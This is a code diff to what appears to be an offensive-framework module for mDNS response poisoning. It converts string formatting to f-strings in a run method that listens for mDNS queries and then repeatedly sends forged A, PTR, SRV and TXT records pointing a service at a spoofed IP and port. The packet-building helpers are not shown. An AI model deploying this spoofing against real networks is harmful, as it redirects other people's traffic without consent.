@@ -221,24 +221,24 @@ class Exploit(Exploit):
     @multi
     def run(self):
         print_status("mDNS response poisoning attack")
-        print_info("Service: {} -> {}:{}".format(self.spoof_name, self.spoof_ip, self.spoof_port))
-        print_info("Service type: {}".format(self.service_type))
-        print_info("TTL: {} seconds".format(self.ttl))
+        print_info(f"Service: {self.spoof_name} -> {self.spoof_ip}:{self.spoof_port}")
+        print_info(f"Service type: {self.service_type}")
+        print_info(f"TTL: {self.ttl} seconds")
 
         print_status("Listening for mDNS queries (3 seconds)...")
         queries = self._listen_for_queries(3)
         if queries:
-            print_info("Detected {} mDNS query source(s):".format(len(queries)))
+            print_info(f"Detected {len(queries)} mDNS query source(s):")
             for q in queries[:10]:
                 print_info("  {} - {} question(s)".format(q["src"], q["questions"]))
         else:
             print_info("No mDNS queries detected (may need longer listen window)")
 
         poison_pkt = self._build_poison_packet()
-        print_info("Poison packet: {} bytes".format(len(poison_pkt)))
+        print_info(f"Poison packet: {len(poison_pkt)} bytes")
 
         target_addr = str(self.target) if self.target.strip() else _MDNS_ADDR
-        print_status("Sending {} poison responses to {}...".format(self.repeat_count, target_addr))
+        print_status(f"Sending {self.repeat_count} poison responses to {target_addr}...")
 
         sent = 0
         for i in range(int(self.repeat_count)):
@@ -247,13 +247,13 @@ class Exploit(Exploit):
             if i < int(self.repeat_count) - 1:
                 time.sleep(float(self.repeat_interval))
 
-        print_success("{}/{} poison packets sent".format(sent, self.repeat_count))
+        print_success(f"{sent}/{self.repeat_count} poison packets sent")
 
         headers = ("Record Type", "Name", "Value", "TTL")
         rows = [
             ("A", self.spoof_name.split(".")[0] + ".local", self.spoof_ip, str(self.ttl)),
             ("PTR", self.service_type, self.spoof_name, str(self.ttl)),
-            ("SRV", self.spoof_name, "port {}".format(self.spoof_port), str(self.ttl)),
+            ("SRV", self.spoof_name, f"port {self.spoof_port}", str(self.ttl)),
             ("TXT", self.spoof_name, "path=/", str(self.ttl)),
         ]
         print_table(headers, *rows)
